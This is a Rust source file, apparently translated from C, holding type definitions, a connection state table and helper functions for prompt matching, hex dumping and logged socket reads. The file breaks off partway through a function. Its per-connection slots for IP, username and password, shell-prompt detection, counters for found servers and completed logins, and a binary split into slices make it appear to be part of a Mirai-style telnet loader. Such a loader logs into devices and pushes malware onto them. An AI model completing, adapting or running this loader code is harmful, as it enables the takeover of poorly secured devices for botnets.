use ::libc;
extern "C" {
    pub type _IO_wide_data;
    pub type _IO_codecvt;
    pub type _IO_marker;
    static mut stdout: *mut FILE;
    static mut stderr: *mut FILE;
    fn fflush(__stream: *mut FILE) -> libc::c_int;
    fn fopen(_: *const libc::c_char, _: *const libc::c_char) -> *mut FILE;
    fn fprintf(_: *mut FILE, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn printf(_: *const libc::c_char, _: ...) -> libc::c_int;
    fn sprintf(_: *mut libc::c_char, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn vsprintf(
        _: *mut libc::c_char,
        _: *const libc::c_char,
        _: ::std::ffi::VaList,
    ) -> libc::c_int;
    fn fgets(
        __s: *mut libc::c_char,
        __n: libc::c_int,
        __stream: *mut FILE,
    ) -> *mut libc::c_char;
    fn perror(__s: *const libc::c_char);
    fn atoi(__nptr: *const libc::c_char) -> libc::c_int;
    fn malloc(_: libc::c_ulong) -> *mut libc::c_void;
    fn calloc(_: libc::c_ulong, _: libc::c_ulong) -> *mut libc::c_void;
    fn free(__ptr: *mut libc::c_void);
    fn exit(_: libc::c_int) -> !;
    fn close(__fd: libc::c_int) -> libc::c_int;
    fn read(__fd: libc::c_int, __buf: *mut libc::c_void, __nbytes: size_t) -> ssize_t;
    fn sleep(__seconds: libc::c_uint) -> libc::c_uint;
    fn usleep(__useconds: __useconds_t) -> libc::c_int;
    fn memset(
        _: *mut libc::c_void,
        _: libc::c_int,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn memcmp(
        _: *const libc::c_void,
        _: *const libc::c_void,
        _: libc::c_ulong,
    ) -> libc::c_int;
    fn memchr(
        _: *const libc::c_void,
        _: libc::c_int,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn strcpy(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strncpy(
        _: *mut libc::c_char,
        _: *const libc::c_char,
        _: libc::c_ulong,
    ) -> *mut libc::c_char;
    fn strncat(
        _: *mut libc::c_char,
        _: *const libc::c_char,
        _: libc::c_ulong,
    ) -> *mut libc::c_char;
    fn strdup(_: *const libc::c_char) -> *mut libc::c_char;
    fn strchr(_: *const libc::c_char, _: libc::c_int) -> *mut libc::c_char;
    fn strstr(_: *const libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strcasestr(
        __haystack: *const libc::c_char,
        __needle: *const libc::c_char,
    ) -> *mut libc::c_char;
    fn strlen(_: *const libc::c_char) -> libc::c_ulong;
    fn strsep(
        __stringp: *mut *mut libc::c_char,
        __delim: *const libc::c_char,
    ) -> *mut libc::c_char;
    fn socket(
        __domain: libc::c_int,
        __type: libc::c_int,
        __protocol: libc::c_int,
    ) -> libc::c_int;
    fn bind(__fd: libc::c_int, __addr: *const sockaddr, __len: socklen_t) -> libc::c_int;
    fn connect(
        __fd: libc::c_int,
        __addr: *const sockaddr,
        __len: socklen_t,
    ) -> libc::c_int;
    fn send(
        __fd: libc::c_int,
        __buf: *const libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
    ) -> ssize_t;
    fn recv(
        __fd: libc::c_int,
        __buf: *mut libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
    ) -> ssize_t;
    fn getsockopt(
        __fd: libc::c_int,
        __level: libc::c_int,
        __optname: libc::c_int,
        __optval: *mut libc::c_void,
        __optlen: *mut socklen_t,
    ) -> libc::c_int;
    fn setsockopt(
        __fd: libc::c_int,
        __level: libc::c_int,
        __optname: libc::c_int,
        __optval: *const libc::c_void,
        __optlen: socklen_t,
    ) -> libc::c_int;
    fn shutdown(__fd: libc::c_int, __how: libc::c_int) -> libc::c_int;
    fn htons(__hostshort: uint16_t) -> uint16_t;
    fn signal(
        __sig: libc::c_int,
        __handler: Option::<unsafe extern "C" fn(libc::c_int) -> ()>,
    ) -> __sighandler_t;
    fn fcntl(__fd: libc::c_int, __cmd: libc::c_int, _: ...) -> libc::c_int;
    fn open(__file: *const libc::c_char, __oflag: libc::c_int, _: ...) -> libc::c_int;
    fn __errno_location() -> *mut libc::c_int;
    fn inet_addr(__cp: *const libc::c_char) -> in_addr_t;
    fn time(__timer: *mut time_t) -> time_t;
    fn strftime(
        __s: *mut libc::c_char,
        __maxsize: size_t,
        __format: *const libc::c_char,
        __tp: *const tm,
    ) -> size_t;
    fn localtime(__timer: *const time_t) -> *mut tm;
    fn pthread_create(
        __newthread: *mut pthread_t,
        __attr: *const pthread_attr_t,
        __start_routine: Option::<
            unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void,
        >,
        __arg: *mut libc::c_void,
    ) -> libc::c_int;
    fn pthread_mutex_init(
        __mutex: *mut pthread_mutex_t,
        __mutexattr: *const pthread_mutexattr_t,
    ) -> libc::c_int;
    fn pthread_mutex_lock(__mutex: *mut pthread_mutex_t) -> libc::c_int;
    fn pthread_mutex_unlock(__mutex: *mut pthread_mutex_t) -> libc::c_int;
    fn epoll_create(__size: libc::c_int) -> libc::c_int;
    fn epoll_ctl(
        __epfd: libc::c_int,
        __op: libc::c_int,
        __fd: libc::c_int,
        __event: *mut epoll_event,
    ) -> libc::c_int;
    fn epoll_wait(
        __epfd: libc::c_int,
        __events: *mut epoll_event,
        __maxevents: libc::c_int,
        __timeout: libc::c_int,
    ) -> libc::c_int;
    fn ceil(_: libc::c_double) -> libc::c_double;
}
pub type __builtin_va_list = [__va_list_tag; 1];
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __va_list_tag {
    pub gp_offset: libc::c_uint,
    pub fp_offset: libc::c_uint,
    pub overflow_arg_area: *mut libc::c_void,
    pub reg_save_area: *mut libc::c_void,
}
pub type size_t = libc::c_ulong;
pub type __gnuc_va_list = __builtin_va_list;
pub type __uint8_t = libc::c_uchar;
pub type __uint16_t = libc::c_ushort;
pub type __uint32_t = libc::c_uint;
pub type __uint64_t = libc::c_ulong;
pub type __off_t = libc::c_long;
pub type __off64_t = libc::c_long;
pub type __time_t = libc::c_long;
pub type __useconds_t = libc::c_uint;
pub type __ssize_t = libc::c_long;
pub type __socklen_t = libc::c_uint;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_FILE {
    pub _flags: libc::c_int,
    pub _IO_read_ptr: *mut libc::c_char,
    pub _IO_read_end: *mut libc::c_char,
    pub _IO_read_base: *mut libc::c_char,
    pub _IO_write_base: *mut libc::c_char,
    pub _IO_write_ptr: *mut libc::c_char,
    pub _IO_write_end: *mut libc::c_char,
    pub _IO_buf_base: *mut libc::c_char,
    pub _IO_buf_end: *mut libc::c_char,
    pub _IO_save_base: *mut libc::c_char,
    pub _IO_backup_base: *mut libc::c_char,
    pub _IO_save_end: *mut libc::c_char,
    pub _markers: *mut _IO_marker,
    pub _chain: *mut _IO_FILE,
    pub _fileno: libc::c_int,
    pub _flags2: libc::c_int,
    pub _old_offset: __off_t,
    pub _cur_column: libc::c_ushort,
    pub _vtable_offset: libc::c_schar,
    pub _shortbuf: [libc::c_char; 1],
    pub _lock: *mut libc::c_void,
    pub _offset: __off64_t,
    pub _codecvt: *mut _IO_codecvt,
    pub _wide_data: *mut _IO_wide_data,
    pub _freeres_list: *mut _IO_FILE,
    pub _freeres_buf: *mut libc::c_void,
    pub __pad5: size_t,
    pub _mode: libc::c_int,
    pub _unused2: [libc::c_char; 20],
}
pub type _IO_lock_t = ();
pub type FILE = _IO_FILE;
pub type va_list___0 = __gnuc_va_list;
pub type ssize_t = __ssize_t;
pub type time_t = __time_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __pthread_internal_list {
    pub __prev: *mut __pthread_internal_list,
    pub __next: *mut __pthread_internal_list,
}
pub type __pthread_list_t = __pthread_internal_list;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __pthread_mutex_s {
    pub __lock: libc::c_int,
    pub __count: libc::c_uint,
    pub __owner: libc::c_int,
    pub __nusers: libc::c_uint,
    pub __kind: libc::c_int,
    pub __spins: libc::c_short,
    pub __elision: libc::c_short,
    pub __list: __pthread_list_t,
}
pub type pthread_t = libc::c_ulong;
#[derive(Copy, Clone)]
#[repr(C)]
pub union __anonunion_pthread_mutexattr_t_488594144 {
    pub __size: [libc::c_char; 4],
    pub __align: libc::c_int,
}
pub type pthread_mutexattr_t = __anonunion_pthread_mutexattr_t_488594144;
#[derive(Copy, Clone)]
#[repr(C)]
pub union pthread_attr_t {
    pub __size: [libc::c_char; 56],
    pub __align: libc::c_long,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub union __anonunion_pthread_mutex_t_335460617 {
    pub __data: __pthread_mutex_s,
    pub __size: [libc::c_char; 40],
    pub __align: libc::c_long,
}
pub type pthread_mutex_t = __anonunion_pthread_mutex_t_335460617;
pub type socklen_t = __socklen_t;
pub type sa_family_t = libc::c_ushort;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr {
    pub sa_family: sa_family_t,
    pub sa_data: [libc::c_char; 14],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct linger {
    pub l_onoff: libc::c_int,
    pub l_linger: libc::c_int,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr_in {
    pub sin_family: sa_family_t,
    pub sin_port: in_port_t,
    pub sin_addr: in_addr,
    pub sin_zero: [libc::c_uchar; 8],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct in_addr {
    pub s_addr: in_addr_t,
}
pub type in_addr_t = uint32_t;
pub type uint32_t = __uint32_t;
pub type in_port_t = uint16_t;
pub type uint16_t = __uint16_t;
pub type uint8_t = __uint8_t;
pub type uint64_t = __uint64_t;
pub type __sighandler_t = Option::<unsafe extern "C" fn(libc::c_int) -> ()>;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct tm {
    pub tm_sec: libc::c_int,
    pub tm_min: libc::c_int,
    pub tm_hour: libc::c_int,
    pub tm_mday: libc::c_int,
    pub tm_mon: libc::c_int,
    pub tm_year: libc::c_int,
    pub tm_wday: libc::c_int,
    pub tm_yday: libc::c_int,
    pub tm_isdst: libc::c_int,
    pub tm_gmtoff: libc::c_long,
    pub tm_zone: *const libc::c_char,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub union epoll_data {
    pub ptr: *mut libc::c_void,
    pub fd: libc::c_int,
    pub u32_0: uint32_t,
    pub u64_0: uint64_t,
}
pub type epoll_data_t = epoll_data;
#[derive(Copy, Clone)]
#[repr(C, packed)]
pub struct epoll_event {
    pub events: uint32_t,
    pub data: epoll_data_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct stateSlot_t {
    pub slotUsed: libc::c_int,
    pub mutex: pthread_mutex_t,
    pub success: libc::c_uchar,
    pub is_open: libc::c_uchar,
    pub special: libc::c_uchar,
    pub got_prompt: libc::c_uchar,
    pub pathInd: uint8_t,
    pub echoInd: uint16_t,
    pub complete: libc::c_int,
    pub ip: uint32_t,
    pub fd: libc::c_int,
    pub updatedAt: libc::c_int,
    pub reconnecting: libc::c_int,
    pub state: libc::c_uchar,
    pub path: [[libc::c_char; 32]; 5],
    pub username: [libc::c_char; 32],
    pub password: [libc::c_char; 32],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __anonstruct_binary_838077917 {
    pub num_slices: libc::c_int,
    pub slices: *mut *mut libc::c_uchar,
}
static mut bind_ip: *mut libc::c_char = b"0.0.0.0\0" as *const u8 as *const libc::c_char
    as *mut libc::c_char;
static mut debug_mode: libc::c_uchar = 0 as libc::c_int as libc::c_uchar;
static mut maxConnectedSockets: libc::c_int = 0 as libc::c_int;
pub static mut running_threads: libc::c_int = 0 as libc::c_int;
pub static mut found_srvs: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
pub static mut bytes_sent: libc::c_uint = 0 as libc::c_int as libc::c_uint;
pub static mut timed_out: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
pub static mut login_done: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
pub static mut failed_connect: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
pub static mut remote_hangup: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
pub static mut port: libc::c_ushort = 0 as libc::c_int as libc::c_ushort;
pub static mut maxFDSaw: libc::c_uint = 0 as libc::c_int as libc::c_uint;
pub static mut infd: *mut FILE = 0 as *const FILE as *mut FILE;
pub static mut run_arg: *mut libc::c_char = 0 as *const libc::c_void as *mut libc::c_void
    as *mut libc::c_char;
static mut epollFD: libc::c_int = 0;
pub static mut binary: __anonstruct_binary_838077917 = __anonstruct_binary_838077917 {
    num_slices: 0,
    slices: 0 as *const *mut libc::c_uchar as *mut *mut libc::c_uchar,
};
pub static mut stateTable: [stateSlot_t; 1] = [
    {
        let mut init = stateSlot_t {
            slotUsed: 0 as libc::c_int,
            mutex: __anonunion_pthread_mutex_t_335460617 {
                __data: {
                    let mut init = __pthread_mutex_s {
                        __lock: 0 as libc::c_int,
                        __count: 0 as libc::c_uint,
                        __owner: 0 as libc::c_int,
                        __nusers: 0 as libc::c_uint,
                        __kind: 0 as libc::c_int,
                        __spins: 0 as libc::c_int as libc::c_short,
                        __elision: 0 as libc::c_int as libc::c_short,
                        __list: {
                            let mut init = __pthread_internal_list {
                                __prev: 0 as *const __pthread_internal_list
                                    as *mut __pthread_internal_list,
                                __next: 0 as *const __pthread_internal_list
                                    as *mut __pthread_internal_list,
                            };
                            init
                        },
                    };
                    init
                },
            },
            success: 0 as libc::c_int as libc::c_uchar,
            is_open: 0 as libc::c_int as libc::c_uchar,
            special: 0 as libc::c_int as libc::c_uchar,
            got_prompt: 0 as libc::c_int as libc::c_uchar,
            pathInd: 0 as libc::c_int as libc::c_uchar,
            echoInd: 0 as libc::c_int as libc::c_ushort,
            complete: 0 as libc::c_int,
            ip: 0 as libc::c_uint,
            fd: 0 as libc::c_int,
            updatedAt: 0 as libc::c_int,
            reconnecting: 0 as libc::c_int,
            state: 0 as libc::c_int as libc::c_uchar,
            path: [
                [
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                ],
                [
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                ],
                [
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                ],
                [
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                ],
                [
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                    0 as libc::c_int as libc::c_char,
                ],
            ],
            username: [
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
            ],
            password: [
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
                0 as libc::c_int as libc::c_char,
            ],
        };
        init
    },
];
pub unsafe extern "C" fn matchPrompt(mut bufStr: *mut libc::c_char) -> libc::c_int {
    let mut i: libc::c_int = 0;
    let mut q: libc::c_int = 0;
    let mut prompts: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmpStr: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp: size_t = 0;
    let mut tmp___0: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___1: size_t = 0;
    let mut in_escape: libc::c_char = 0;
    let mut tmp___2: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___3: size_t = 0;
    let mut bufLen: libc::c_int = 0;
    let mut tmp___4: size_t = 0;
    let mut tmp___5: size_t = 0;
    i = 0 as libc::c_int;
    q = 0 as libc::c_int;
    prompts = b":>%$#\0" as *const u8 as *const libc::c_char as *mut libc::c_char;
    tmp = strlen(bufStr as *const libc::c_char);
    tmp___0 = malloc(tmp.wrapping_add(1 as libc::c_ulong));
    tmpStr = tmp___0 as *mut libc::c_char;
    tmp___1 = strlen(bufStr as *const libc::c_char);
    memset(
        tmpStr as *mut libc::c_void,
        0 as libc::c_int,
        tmp___1.wrapping_add(1 as libc::c_ulong),
    );
    in_escape = 0 as libc::c_int as libc::c_char;
    i = 0 as libc::c_int;
    loop {
        tmp___3 = strlen(bufStr as *const libc::c_char);
        if !((i as size_t) < tmp___3) {
            break;
        }
        if *bufStr.offset(i as isize) as libc::c_int == 27 as libc::c_int {
            if in_escape as libc::c_int == 0 as libc::c_int {
                in_escape = 1 as libc::c_int as libc::c_char;
            }
        } else {
            let mut current_block_20: u64;
            if in_escape as libc::c_int == 1 as libc::c_int {
                tmp___2 = strchr(
                    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\0"
                        as *const u8 as *const libc::c_char,
                    *bufStr.offset(i as isize) as libc::c_int,
                );
                if tmp___2 as libc::c_ulong != 0 as *mut libc::c_void as libc::c_ulong {
                    in_escape = 0 as libc::c_int as libc::c_char;
                    current_block_20 = 7172762164747879670;
                } else {
                    current_block_20 = 1546103235980764394;
                }
            } else {
                current_block_20 = 1546103235980764394;
            }
            match current_block_20 {
                1546103235980764394 => {
                    if in_escape as libc::c_int == 0 as libc::c_int {
                        strncat(
                            tmpStr,
                            bufStr.offset(i as isize) as *const libc::c_char,
                            1 as libc::c_int as size_t,
                        );
                    }
                }
                _ => {}
            }
        }
        i += 1;
    }
    tmp___4 = strlen(tmpStr as *const libc::c_char);
    bufLen = tmp___4 as libc::c_int;
    i = 0 as libc::c_int;
    loop {
        tmp___5 = strlen(prompts as *const libc::c_char);
        if !((i as size_t) < tmp___5) {
            break;
        }
        while bufLen > q {
            if !(*tmpStr.offset(bufLen as isize).offset(-(q as isize)) as libc::c_int
                == 0 as libc::c_int)
            {
                if !(*tmpStr.offset(bufLen as isize).offset(-(q as isize)) as libc::c_int
                    == 32 as libc::c_int)
                {
                    if !(*tmpStr.offset(bufLen as isize).offset(-(q as isize))
                        as libc::c_int == 13 as libc::c_int)
                    {
                        if !(*tmpStr.offset(bufLen as isize).offset(-(q as isize))
                            as libc::c_int == 10 as libc::c_int)
                        {
                            break;
                        }
                    }
                }
            }
            q += 1;
        }
        if *tmpStr.offset(bufLen as isize).offset(-(q as isize)) as libc::c_int
            == *prompts.offset(i as isize) as libc::c_int
        {
            free(tmpStr as *mut libc::c_void);
            return 1 as libc::c_int;
        }
        i += 1;
    }
    free(tmpStr as *mut libc::c_void);
    return 0 as libc::c_int;
}
pub unsafe extern "C" fn hexDump(
    mut desc: *mut libc::c_char,
    mut addr: *mut libc::c_void,
    mut len: libc::c_int,
) {
    let mut i: libc::c_int = 0;
    let mut buff: [libc::c_uchar; 17] = [0; 17];
    let mut pc: *mut libc::c_uchar = 0 as *mut libc::c_uchar;
    pc = addr as *mut libc::c_uchar;
    if desc as libc::c_ulong != 0 as *mut libc::c_void as libc::c_ulong {
        printf(b"%s:\n\0" as *const u8 as *const libc::c_char, desc);
    }
    i = 0 as libc::c_int;
    while i < len {
        if i % 16 as libc::c_int == 0 as libc::c_int {
            if i != 0 as libc::c_int {
                printf(
                    b"  %s\n\0" as *const u8 as *const libc::c_char,
                    buff.as_mut_ptr(),
                );
            }
            printf(b"  %04x \0" as *const u8 as *const libc::c_char, i);
        }
        printf(
            b" %02x\0" as *const u8 as *const libc::c_char,
            *pc.offset(i as isize) as libc::c_int,
        );
        if (*pc.offset(i as isize) as libc::c_int) < 32 as libc::c_int {
            buff[(i % 16 as libc::c_int) as usize] = '.' as i32 as libc::c_uchar;
        } else if *pc.offset(i as isize) as libc::c_int > 126 as libc::c_int {
            buff[(i % 16 as libc::c_int) as usize] = '.' as i32 as libc::c_uchar;
        } else {
            buff[(i % 16 as libc::c_int) as usize] = *pc.offset(i as isize);
        }
        buff[(i % 16 as libc::c_int + 1 as libc::c_int)
            as usize] = '\u{0}' as i32 as libc::c_uchar;
        i += 1;
    }
    while i % 16 as libc::c_int != 0 as libc::c_int {
        printf(b"   \0" as *const u8 as *const libc::c_char);
        i += 1;
    }
    printf(b"  %s\n\0" as *const u8 as *const libc::c_char, buff.as_mut_ptr());
}
pub unsafe extern "C" fn log_recv(
    mut sock: libc::c_int,
    mut buf: *mut libc::c_void,
    mut len: libc::c_int,
    mut flags: libc::c_int,
) -> libc::c_int {
    let mut ret: libc::c_int = 0;
    let mut tmp: ssize_t = 0;
    let mut i: libc::c_int = 0;
    let mut hex_buf: [libc::c_char; 32] = [0; 32];
    let mut tmp___0: libc::c_uint = 0;
    memset(buf, 0 as libc::c_int, len as size_t);
    tmp = recv(sock, buf, len as size_t, flags);
    ret = tmp as libc::c_int;
    if ret > 0 as libc::c_int {
        i = 0 as libc::c_int;
        i = 0 as libc::c_int;
        while i < ret {
            if *(buf as *mut libc::c_char).offset(i as isize) as libc::c_int
                == 0 as libc::c_int
            {
                *(buf as *mut libc::c_char)
                    .offset(i as isize) = 'A' as i32 as libc::c_char;
            }
            i += 1;
        }
    }
    if debug_mode != 0 {
        hex_buf[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
        tmp___0 = 1 as libc::c_uint;
        while !(tmp___0 >= 32 as libc::c_uint) {
            hex_buf[tmp___0 as usize] = 0 as libc::c_int as libc::c_char;
            tmp___0 = tmp___0.wrapping_add(1);
        }
        sprintf(
            hex_buf.as_mut_ptr(),
            b"state %d - recv: %d\0" as *const u8 as *const libc::c_char,
            stateTable[sock as usize].state as libc::c_int,
            ret,
        );
        if ret != -(1 as libc::c_int) {
            hexDump(hex_buf.as_mut_ptr(), buf, ret);
        } else {
            printf(b"%s\n\0" as *const u8 as *const libc::c_char, hex_buf.as_mut_ptr());
        }
    }
    return ret;
}
pub unsafe extern "C" fn log_send(
    mut sock: libc::c_int,
    mut buf: *mut libc::c_void,
    mut len: libc::c_int,
    mut flags: libc::c_int,
) -> libc::c_int {
    let mut hex_buf: [libc::c_char; 32] = [0; 32];
